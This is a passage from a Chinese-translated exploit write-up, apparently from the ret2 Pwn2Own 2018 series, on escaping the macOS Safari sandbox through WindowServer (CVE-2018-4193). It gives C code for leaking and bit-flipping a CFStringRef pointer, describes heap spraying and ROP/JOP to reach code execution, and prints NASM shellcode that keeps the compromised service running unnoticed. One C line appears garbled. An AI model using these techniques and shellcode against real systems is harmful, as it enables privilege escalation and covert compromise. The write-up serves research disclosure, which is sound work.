            break;
        }
    }
此外，该API还会以整数的形式返回某些HotKey字段，因此，会"泄漏"悬空的HotKey下面的一些数据。通过将leak1和leak3拼接在一起，我们实际上可以根据重叠的CFMutableArray来重构一个CFStringRef指针（在MALLOC_LARGE堆中分配空间）：
    //
    // we only use this leak to determine whether we should flip
    // the bit in an string pointer one way or another.
    //
    *big_heap_leak = (((uint64_t)leak1 > 8);
在这个例子中，我们发现重建的指针是0x1BD7BB000。由于已经设置了第24位，所以，为了破坏该指针，必须禁用该悬空的HotKey。这个破坏行为会把CFStringRef指针从0x1BD7BB000变为0x1BC7BB000。
    bool corrupt_cf_ptr(uint64_t hotkey_id, uint64_t big_heap_leak)
    {
        //
        // flip a single bit (0x00000001000000) in a CFStringRef pointer
        // laid beneath our 'dangling' hotkey
        //
        bool flip = (big_heap_leak & 0x1000000) == 0x1000000;
        printf("[*] Corrupting %p --> %p\n", (void*)big_heap_leak, (void*)(big_heap_leak ^ 0x1000000));
        return CGSSetHotKeyEnabled(g_cid, hotkey_id, flip) == 0;
    }
至此，我们终于完成了破坏一个Objective-C指针的任务。
**代码执行**
* * *
在“捯饬”悬空的HotKey（第三阶段）下面的CFMutableArray的过程中，我们还向WindowServer的MALLOC_LARGE堆中喷射了大量的字符串对象。这些（由CFStringRef成员指向的）大字符串中含有我们的最终ROP链和伪造的Objective-C
ISA。
通过在第三阶段翻转CFStringRef指针中的单个高位，并不让被破坏的指针进行对齐处理，最终使其指向我们喷射的伪Objective-C字符串结构：
最终的漏洞利用代码示意图，它经过了多次喷射和破坏处理
这样的话，我们只需释放其父CFMutableArray，就能释放被破坏的CFStringRef。我们的漏洞利用代码将使用Phrack中介绍的objc_msgSend()技术来劫持控制流。
我们借助一个定制的COP gadget实现了任意的ROP，剩下的就是一些相对普通的ROP＆JOP了。此后，用ROP链不断映射RWX
shellcode内存页面，直到跳转至该页面为止，从而导致WindowServer系统服务中的任意代码执行漏洞，实现Safari沙箱逃逸。
**正常运行**
* * *
通常来说，这些类型的writeup文章会省略这一步，但是，我们的Pwn2Own漏洞利用代码的最后一步则可以确保被利用的服务能够继续执行。由于WindowServer是负责绘制用户桌面的核心系统服务，因此，在获取root
shell之后，漏洞利用代码必须确保该服务不会发生崩溃。
我们使用shellcode来仔细清理漏洞利用过程中对WindowServer进程造成的一些损害。我们在这个阶段着力不多，只是将指向连接的属性字典和HotKey链的指针中性化，以尽量减少对其他分配空间所造成的附带损害。
    ; compiled with: nasm shellcode.asm
    BITS 64
    _start:
        add     rsp, 0x10000
        mov     r15, rax
        mov     [r15+0x3F00], r15           ; save the address of our shellcode
    repair_objc:
        mov     rbx, [r15+0x3F28]
        sub     rbx, 0x75
        sub     byte [rbx], 0x70
    repair_ws:
        mov     rdi, [r15+0x3F08]           ; ConnectionID
        call    [r15+0x3F10]                ; call CGXConnectionForConnectionID
        xor     r14, r14
        mov     [rax+144], r14              ; nuke HotKey pointer
        mov     [rax+160], r14              ; nuke Property Dictionary
    resume_ws:
        lea     rbx, [r15+0x3F18]           ; ptr to _get_default_connection_tls_key_key
        mov     rbx, [rbx]
        xorps   xmm1, xmm1
        jmp     [r15+0x3F20]                ; jmp SLXServer
    ; Pseudo DATA section at 0x3F00
    ; 0x3F00: [shellcode pointer]
    ; 0x3F08: [ConnectionID]
    ; 0x3F10: [CGXConnectionForConnectionID]
    ; 0x3F18: [_get_default_connection_tls_key_key]
    ; 0x3F20: [SLXServer Loop]
    ; 0x3F28: [SEL_release]
删除了对我们的畸形分配空间的根引用后，该shellcode尝试将被劫持的控制流返回给WindowServer的SLXServer()例程底部的主mach消息处理循环：
这个含有1个构造块的无限循环是WindowServer mach消息处理线程的根
事实证明，这足以将WindowServer可靠地恢复到稳定状态，从而实现持续运行，这样的话，受害者就感觉不到漏洞利用代码所做的一切。
**漏洞利用代码的统计数据**
* * *
这个漏洞利用代码中使用的[漏洞](http://blog.ret2.io/2018/07/25/pwn2own-2018-safari-sandbox/#discovery--root-cause-analysis
"漏洞")（CVE-2018-4193）是于2018年2月16日被发现的。与[JavaScriptCore漏洞](https://blog.ret2.io/2018/07/11/pwn2own-2018-jsc-exploit/ "JavaScriptCore漏洞")一样，为了研究、武器化和稳定利用这个漏洞，大约花费了100个工时。
在参加Pwn2Own 2018大赛之前，我们在13英寸、i5处理器的2017 MacBook
Pro系统上进行了1000多次测试，每次测试后自动重启，结果全链的成功率在85％左右。
测试截图
老实说，我们的沙箱逃逸技术并不是非常理想。其中，大部分的失败都与WindowServer堆的整理有关。平均而言，全链（Safari +
Sandbox）的运行时间大于90秒，其中大部分时间都是用于整理WindowServer堆。这种沙箱逃逸技术被亲切地称为永恒的新郎（Eternal
Groom）。
**将来的研究方向**
* * *
通过更深入地了解WindowServer内部结构和macOS堆，这种漏洞利用方法的可靠性会更高，并且复杂性会进一步降低。虽然我们在这篇文章中详述的方法已经能够正常发挥功能，但是，我们认为该技术还处于萌芽阶段，仍有巨大的潜力可挖。
为了验证我们的判断是否正确，我们迫切希望看到有人在这一方向上继续深耕并做出更好的成绩，因此，我们决定向第一位发布符合以下标准的漏洞利用代码的研究人员颁发一份[Binary
Ninja](https://binary.ninja/ "Binary Ninja") Commercial License (MSRP $599) ：
  * 仅通过CVE-2018-4193漏洞利用macOS 10.13.3上的WindowServer
  * 在10秒之内完成WindowServer的代码执行攻击
  * 不会使WindowServer崩溃
  * 成功率达到90％或更高
为了向社区提供更好的教育资源，研究人员必须发布相应的漏洞利用文章和源代码，才能获得相应的奖励。该挑战条款将于2019年1月1日或首次成功兑换后到期。如果您有任何疑问，请在发布前与我们联系。
为了帮助人们进一步研究这个安全问题，我们已经在GitHub上[发布](https://github.com/ret2/p2o_2018
"发布")了我们自己的Pwn2Own 2018漏洞利用代码。
**结束语**
* * *
在编写这个文章系列的过程中，我们参考了无数的公开资源，以及众多开源技术。我们的漏洞利用技术，是建立在有条件要利用，没有条件创造条件也要利用的基础之上的。
成功哪有什么秘诀，只有苦逼干活。